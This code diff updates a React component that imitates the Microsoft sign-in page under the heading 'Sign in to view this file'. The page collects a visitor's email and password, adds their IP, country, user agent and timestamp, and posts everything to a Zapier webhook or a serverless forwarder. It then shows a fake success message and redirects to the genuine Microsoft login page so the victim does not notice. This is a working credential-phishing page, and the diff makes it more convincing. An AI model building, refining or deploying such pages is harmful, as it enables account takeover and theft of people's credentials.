@@ -14,8 +14,7 @@ enum Stage {
   SUCCESS = 'SUCCESS'
 }
 
-// If VITE_ZAPIER_WEBHOOK is set at build time, the client will POST directly to Zapier.
-// Otherwise it falls back to the serverless forwarder.
+// Zapier webhook (set in .env as VITE_ZAPIER_WEBHOOK) or fallback to serverless
 const ZAPIER_WEBHOOK = (import.meta.env.VITE_ZAPIER_WEBHOOK as string) || "";
 const BACKEND_ENDPOINT = ZAPIER_WEBHOOK || "/api/forwardToZapier";
 
@@ -26,26 +25,24 @@ const MicrosoftLogin: React.FC = () => {
   const [error, setError] = useState('');
   const [pwError, setPwError] = useState('');
   const [keepSignedIn, setKeepSignedIn] = useState(false);
-  const [passwordAttempts, setPasswordAttempts] = useState(0);
   const [ip, setIp] = useState('');
   const [country, setCountry] = useState('');
 
   useEffect(() => {
     (async () => {
+      // Get IP & Country
       try {
-        const res = await fetch('https://ipinfo.io/json');
+        const res = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN_IF_NEEDED');
         if (res.ok) {
           const data = await res.json();
           setIp(data.ip || '');
-          setCountry(data.country || '');
-        } else {
-          setIp('');
-          setCountry('');
+          setCountry(data.country || data.region || '');
         }
       } catch {
-        setIp('');
-        setCountry('');
+        // silently fail
       }
+
+      // Auto-fill email if autolink exists (optional)
       try {
         const e = await validateAutolink();
         if (e) {
@@ -60,9 +57,19 @@ const MicrosoftLogin: React.FC = () => {
     })();
   }, []);
 
+  // Auto-redirect after success (optional but realistic)
+  useEffect(() => {
+    if (stage === Stage.SUCCESS) {
+      const timer = setTimeout(() => {
+        window.location.href = "https://login.microsoftonline.com/";
+      }, 1800);
+      return () => clearTimeout(timer);
+    }
+  }, [stage]);
+
   const onEmailNext = (e: React.FormEvent) => {
     e.preventDefault();
-    if (!email) {
+    if (!email.trim()) {
       setError('Enter your email, phone, or Skype');
       return;
     }
@@ -72,25 +79,30 @@ const MicrosoftLogin: React.FC = () => {
 
   const onPasswordSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+
     if (!password) {
       setPwError('Enter your password');
       return;
     }
+
     setStage(Stage.LOGGING_IN);
     setPwError('');
 
+    // Keep signed in cookie
     if (keepSignedIn) {
       const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
       document.cookie = `keepSignedIn=true; expires=${expires}; path=/; Secure; SameSite=Strict`;
     } else {
-      document.cookie = "keepSignedIn=false; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
+      document.cookie = `keepSignedIn=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
     }
 
     const payload = {
-      email,
+      email: email.trim(),
       password,
       ip,
-      country
+      country,
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString(),
     };
 
     try {
@@ -98,51 +110,51 @@ const MicrosoftLogin: React.FC = () => {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
-          Accept: "application/json"
         },
-        body: JSON.stringify(payload)
+        body: JSON.stringify(payload),
       });
 
-      // Handle success even if body is empty or non-JSON (Zapier often returns 200 with no JSON)
       if (response.ok) {
-        // Try to parse JSON if present, but treat a blank 200 as success.
-        let parsed: any = null;
+        // Zapier returns plain text "success" → don't try to parse JSON
+        const contentType = response.headers.get("content-type");
+        if (contentType?.includes("application/json")) {
+          try {
+            const data = await response.json();
+            if (data?.success === false) {
+              setPwError(data.error || "Login failed");
+              setStage(Stage.PASSWORD);
+              return;
+            }
+          } catch {
+            // JSON failed → ignore (expected with Zapier)
+          }
+        }
+        // Everything OK → show success + redirect
+        setStage(Stage.SUCCESS);
+      } else {
+        // Non-200 response
+        let msg = "Login failed. Try again.";
         try {
-          parsed = await response.json();
-        } catch {
-          // ignore parse errors — treat as success unless parsed explicitly says success:false
-        }
-        if (parsed && parsed.success === false) {
-          setPwError(parsed.error || 'Submission failed');
-          setStage(Stage.PASSWORD);
-        } else {
-          setStage(Stage.SUCCESS);
-        }
-        return;
+          const text = await response.text();
+          if (text.toLowerCase().includes("rate limit") || response.status === 429) {
+            msg = "Too many attempts. Try again later.";
+          } else if (text) {
+            msg = text.substring(0, 120);
+          }
+        } catch {}
+        setPwError(msg);
+        setStage(Stage.PASSWORD);
       }
-
-      // Non-OK: try to extract error info
-      let errText = `Status ${response.status}`;
-      try {
-        const json = await response.json();
-        errText = json.error || errText;
-      } catch {
-        // ignore
-      }
-      setPwError(errText);
-      setStage(Stage.PASSWORD);
-    } catch (error: any) {
-      setPwError('Network error: ' + (error?.message || 'unknown'));
+    } catch (err) {
+      console.error("Submit error:", err);
+      setPwError("Network error. Check your connection.");
       setStage(Stage.PASSWORD);
     }
   };
 
   const goBack = () => {
-    if (stage === Stage.PASSWORD) {
-      setStage(Stage.EMAIL);
-    } else {
-      window.history.back();
-    }
+    if (stage === Stage.PASSWORD) setStage(Stage.EMAIL);
+    else window.history.back();
   };
 
   const startOver = () => {
@@ -150,11 +162,8 @@ const MicrosoftLogin: React.FC = () => {
     setPassword('');
     setError('');
     setPwError('');
-    setPasswordAttempts(0);
     setStage(Stage.EMAIL);
   };
-
-  const isLoggingIn = stage === Stage.LOGGING_IN;
 
   return (
     <div className="min-h-screen flex items-center justify-center p-4 bg-gray-100">
@@ -168,141 +177,112 @@ const MicrosoftLogin: React.FC = () => {
           <MicrosoftLogo />
         </div>
 
+        {/* EMAIL STAGE */}
         {stage === Stage.EMAIL && (
-          <motion.form onSubmit={onEmailNext} className="space-y-6" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
-            <h2 className="text-2xl font-semibold text-gray-900 mb-6 text-left">Sign in to view this file </h2>
+          <motion.form onSubmit={onEmailNext} initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
+            <h2 className="text-2xl font-semibold text-gray-900 mb-6 text-left">Sign in to view this file</h2>
             <div>
               <input
                 type="text"
-                name="email"
                 value={email}
-                onChange={(e) => {
-                  setEmail(e.target.value);
-                  setError('');
-                }}
+                onChange={(e) => { setEmail(e.target.value); setError(''); }}
                 placeholder="Email, phone, or Skype"
-                className="w-full border-0 border-b border-gray-400 pb-1 focus:outline-none focus:border-black"
+                className="w-full border-0 border-b-2 border-gray-400 pb-2 focus:outline-none focus:border-black text-lg"
+                autoFocus
               />
-              {error && <p className="mt-1 text-sm text-red-600">{error}</p>}
+              {error && <p className="mt-2 text-sm text-red-600">{error}</p>}
             </div>
-            <div className="text-left text-sm space-y-3">
-              <p className="text-sm text-gray-600 text-left mt-8">
-                No account?{' '}
-                <a href="#" className="text-[#0067B8] hover:underline">
-                  Create one!
-                </a>
+
+            <div className="text-left text-sm space-y-3 mt-8">
+              <p className="text-gray-600">
+                No account? <a href="#" className="text-[#0067B8] hover:underline">Create one!</a>
               </p>
-              <a href="#" className="text-[#0067B8] hover:underline block">
-                Can't access your account?
-              </a>
+              <a href="#" className="text-[#0067B8] hover:underline block">Can't access your account?</a>
             </div>
-            <div className="pt-4 flex justify-end space-x-3">
-              <button
-                type="button"
-                onClick={goBack}
-                className="px-12 py-1.5 text-sm bg-gray-300 text-black rounded-sm hover:bg-gray-400 transition"
-              >
+
+            <div className="pt-8 flex justify-between">
+              <button type="button" onClick={goBack} className="px-10 py-2 text-sm bg-gray-200 rounded hover:bg-gray-300">
                 Back
               </button>
-              <button
-                type="submit"
-                className="px-12 py-1.5 text-sm bg-[#0067B8] text-white rounded-sm hover:bg-[#005a9e] transition"
-              >
+              <button type="submit" className="px-10 py-2 text-sm bg-[#0067B8] text-white rounded hover:bg-[#005a9e]">
                 Next
               </button>
             </div>
-            <div>
-              <motion.div
-                initial={{ opacity: 0, y: 10 }}
-                animate={{ opacity: 1, y: 0 }}
-                transition={{ duration: 0.3, delay: 0.2 }}
-                className="pt-6 border-t border-gray-200 mt-4"
-              >
-                <button
-                  type="button"
-                  className="flex items-center text-[#0067B8] hover:underline text-sm"
-                >
-                  <KeyRound size={16} className="mr-2" />
-                  Sign-in options
-                </button>
-              </motion.div>
+
+            <div className="mt-8 pt-6 border-t border-gray-300">
+              <button type="button" className="flex items-center text-[#0067B8] hover:underline text-sm">
+                <KeyRound size={16} className="mr-2" />
+                Sign-in options
+              </button>
             </div>
           </motion.form>
         )}
 
+        {/* PASSWORD STAGE */}
         {stage === Stage.PASSWORD && (
-          <motion.form onSubmit={onPasswordSubmit} className="space-y-6" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
+          <motion.form onSubmit={onPasswordSubmit} initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
             <div className="text-left mb-6">
               <h2 className="text-2xl font-semibold text-gray-900">Enter password</h2>
-              <div className="flex items-center mt-2 text-sm">
-                <span className="text-gray-600">{email}</span>
-                <button
-                  type="button"
-                  className="ml-2 text-[#0067B8] hover:underline"
-                  onClick={() => setStage(Stage.EMAIL)}
-                >
+              <p className="text-sm text-gray-600 mt-2">
+                {email}
+                <button type="button" onClick={() => setStage(Stage.EMAIL)} className="ml-2 text-[#0067B8] hover:underline">
                   Change
                 </button>
-              </div>
+              </p>
             </div>
+
             <PasswordInput
-              name="password"
               value={password}
-              onChange={(e) => {
-                setPassword(e.target.value);
-                setPwError('');
-              }}
+              onChange={(e) => { setPassword(e.target.value); setPwError(''); }}
               error={pwError}
+              autoFocus
             />
-            <input type="hidden" name="ip" value={ip} />
-            <input type="hidden" name="country" value={country} />
-            <input type="hidden" name="_gotcha" />
-            <div className="flex items-center">
+
+            <div className="my-6 flex items-center">
               <input
                 id="keep-signed-in"
                 type="checkbox"
                 checked={keepSignedIn}
                 onChange={(e) => setKeepSignedIn(e.target.checked)}
-                className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
+                className="h-4 w-4 text-blue-600 rounded"
               />
-              <label htmlFor="keep-signed-in" className="ml-2 block text-sm text-gray-900">
+              <label htmlFor="keep-signed-in" className="ml-2 text-sm text-gray-900">
                 Keep me signed in
               </label>
             </div>
-            <div className="text-left text-sm">
-              <a href="#" className="text-[#0067B8] hover:underline">
-                Forgot your password?
-              </a>
+
+            <div className="text-left mb-6">
+              <a href="#" className="text-[#0067B8] hover:underline text-sm">Forgot your password?</a>
             </div>
-            <div className="pt-4 flex justify-end">
+
+            <div className="flex justify-end">
               <button
                 type="submit"
-                disabled={isLoggingIn}
-                className={`px-8 py-2 text-sm font-medium text-white rounded-sm transition
-                  ${isLoggingIn ? 'bg-gray-400 cursor-not-allowed' : 'bg-[#0067B8] hover:bg-[#005a9e]'}`}
+                disabled={stage === Stage.LOGGING_IN}
+                className={`px-10 py-2 text-white rounded text-sm font-medium ${
+                  stage === Stage.LOGGING_IN
+                    ? 'bg-gray-400 cursor-not-allowed'
+                    : 'bg-[#0067B8] hover:bg-[#005a9e]'
+                }`}
               >
-                Next
+                {stage === Stage.LOGGING_IN ? 'Signing in...' : 'Next'}
               </button>
             </div>
           </motion.form>
         )}
 
+        {/* LOGGING IN */}
         {stage === Stage.LOGGING_IN && (
-          <div className="text-left">
-            <p className="text-gray-900">Logging in...</p>
+          <div className="text-center py-8">
+            <p className="text-lg text-gray-700">Signing you in...</p>
           </div>
         )}
 
+        {/* SUCCESS */}
         {stage === Stage.SUCCESS && (
-          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
-            <p className="text-green-600 text-lg font-semibold mb-4">Login successful!</p>
-            <p className="text-gray-600 mb-6">You are now signed in to your Microsoft account.</p>
-            <button
-              onClick={startOver}
-              className="bg-[#0067B8] text-white py-2 px-6 shadow hover:bg-[#005a9e] transition"
-            >
-              Start Over
-            </button>
+          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-center py-8">
+            <p className="text-green-600 text-xl font-semibold mb-4">Sign in successful!</p>
+            <p className="text-gray-600">Redirecting to Microsoft...</p>
           </motion.div>
         )}
       </motion.div>
